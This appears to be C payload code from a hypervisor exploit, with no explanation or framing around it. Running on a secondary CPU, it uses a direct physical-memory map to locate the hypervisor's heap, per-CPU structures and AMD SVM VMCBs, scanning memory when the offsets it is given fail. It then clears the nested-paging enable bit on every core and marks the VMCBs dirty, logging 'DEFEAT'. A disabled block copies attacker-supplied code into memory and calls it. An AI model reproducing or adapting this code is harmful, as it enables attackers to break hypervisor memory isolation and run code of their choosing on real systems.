typedef unsigned long long u64;
typedef unsigned int       u32;

#define P_INIT_CB       0
#define P_DMAP          1
#define P_ORACLE        2
#define P_HV            3
#define P_HEAPOFF_ADDR  4
#define P_PCPUS_ADDR    5
#define P_MODE          6
#define P_RES_BASE      8
#define P_NVALID        24
#define P_HEAPVAL       25
#define P_PCPU0VAL      26
#define P_SCK_DST       27
#define P_SCK_SRC       28
#define P_SCK_LEN       29
#define P_HV_SIZE       30

#define ORACLE_ENTERED  0x0000000000001100ULL
#define ORACLE_HEAP_OK  0x0000000000001200ULL
#define ORACLE_CENSUS   0x0000000000001300ULL
#define ORACLE_DEFEAT   0x0000000000001400ULL
#define ORACLE_FAIL     0x000000000000F000ULL

#define VMCB_NESTED_CTRL 0x90
#define VMCB_NESTED_CR3  0xB0
#define VMCB_CONTROL2    0xB8
#define VMCB_CLEAN       0xC0
#define VMCB_M_VMCB      0xA8
#define NESTED_CTRL_INIT 9

static inline u64  rd64(u64 a)        { return *(volatile u64 *)a; }
static inline void wr64(u64 a, u64 v) { *(volatile u64 *)a = v; }
static inline void wr32(u64 a, u32 v) { *(volatile u32 *)a = v; }

void ap_main(u64 *p)
{
  u64 dmap   = p[P_DMAP];
  u64 oracle = p[P_ORACLE];
  u64 H      = p[P_HV];
  u64 hv_size = p[P_HV_SIZE];

  wr64(oracle, ORACLE_ENTERED);

  u64 heap  = rd64(dmap + p[P_HEAPOFF_ADDR]);
  u64 pcpu0 = rd64(dmap + p[P_PCPUS_ADDR]);
  u64 heap_addr = p[P_HEAPOFF_ADDR], pcpus_addr = p[P_PCPUS_ADDR];

  if (!heap || pcpu0 < heap || (pcpu0 - heap) < H || (pcpu0 - heap) >= H + hv_size) {
    u64 ha, pa_, ok = 0;
    for (ha = H + 0x80000; ha < H + 0x90000 && !ok; ha += 8) {
      u64 h2 = rd64(dmap + ha);
      if (!h2) continue;
      for (pa_ = H + 0x80000; pa_ < H + 0x90000; pa_ += 8) {
        u64 good = 0, seen = 0, c;
        for (c = 0; c < 4; c++) {
          u64 v = rd64(dmap + pa_ + c * 8);
          if (!v) continue;
          seen++;
          if (v < h2) break;
          if ((v - h2) < H || (v - h2) >= H + hv_size) break;
          if ((v - h2) & 0xFFF) break;
          good++;
        }
        if (seen >= 2 && good == seen) {
          heap = h2; pcpu0 = rd64(dmap + pa_);
          heap_addr = ha; pcpus_addr = pa_;
          p[P_HEAPOFF_ADDR] = ha; p[P_PCPUS_ADDR] = pa_;
          ok = 1; break;
        }
      }
    }
    if (!ok) { wr64(oracle, ORACLE_FAIL | 3); return; }
  }

  p[P_HEAPVAL]  = heap;
  p[P_PCPU0VAL] = pcpu0;

  if (!heap || pcpu0 < heap) { wr64(oracle, ORACLE_FAIL | 1); return; }

  u64 pcpu0_pa = pcpu0 - heap;
  if (pcpu0_pa < H || pcpu0_pa >= H + hv_size) { wr64(oracle, ORACLE_FAIL | 2); return; }

  wr64(oracle, ORACLE_HEAP_OK);

  u64 nvalid = 0;
  for (int core = 0; core < 16; core++) {
    p[P_RES_BASE + core] = 0;

    u64 pcpu = rd64(dmap + p[P_PCPUS_ADDR] + (u64)core * 8);
    if (!pcpu) continue;

    u64 vmcb = rd64(dmap + (pcpu - heap) + VMCB_M_VMCB);
    if (!vmcb) continue;

    u64 vmcb_pa = vmcb - heap;
    if (vmcb_pa & 0xFFF) continue;
    if (vmcb_pa < H || vmcb_pa >= H + hv_size) continue;

    p[P_RES_BASE + core] = vmcb_pa;

    u32 nc   = *(volatile u32 *)(dmap + vmcb_pa + VMCB_NESTED_CTRL);
    u32 c2   = *(volatile u32 *)(dmap + vmcb_pa + VMCB_CONTROL2);
    u64 ncr3 = rd64(dmap + vmcb_pa + VMCB_NESTED_CR3);

    if ((nc & 0xFF) == NESTED_CTRL_INIT && c2 == 1 && ncr3 && (ncr3 & 0xFFF) == 0)
      nvalid++;
  }
  p[P_NVALID] = nvalid;
  wr64(oracle, ORACLE_CENSUS | nvalid);

  if (nvalid != 16) return;

  if (p[P_MODE] != 1) return;

  for (int core = 0; core < 16; core++) {
    u64 vmcb_pa = p[P_RES_BASE + core];
    if (!vmcb_pa) continue;

    u64 old = rd64(dmap + vmcb_pa + VMCB_NESTED_CTRL);
    wr64(dmap + vmcb_pa + VMCB_NESTED_CTRL, old & ~1ULL);
    wr32(dmap + vmcb_pa + VMCB_CLEAN, 0);
  }
  wr64(oracle, ORACLE_DEFEAT);
}

#if 0

static void ap_main_tail(u64 *p, u64 oracle)
{
  {
    unsigned int ra = 0, rb = 0, rc = 0, rd = 0;
    __asm__ volatile("cpuid" : "+a"(ra), "=b"(rb), "=c"(rc), "=d"(rd));
    wr64(oracle, ORACLE_DEFEAT | 0xA0);
  }

  u64 dst = p[P_SCK_DST], src = p[P_SCK_SRC], len = p[P_SCK_LEN];
  if (dst && src && len) {
    wr64(oracle, ORACLE_DEFEAT | 0xB0);

    volatile unsigned char *d = (volatile unsigned char *)dst;
    volatile unsigned char *s = (volatile unsigned char *)src;
    for (u64 i = 0; i < len; i++) d[i] = s[i];
    wr64(oracle, ORACLE_DEFEAT | 0xB1);
    ((void (*)(u64, u64))dst)(0, 0);
  }
}
#endif
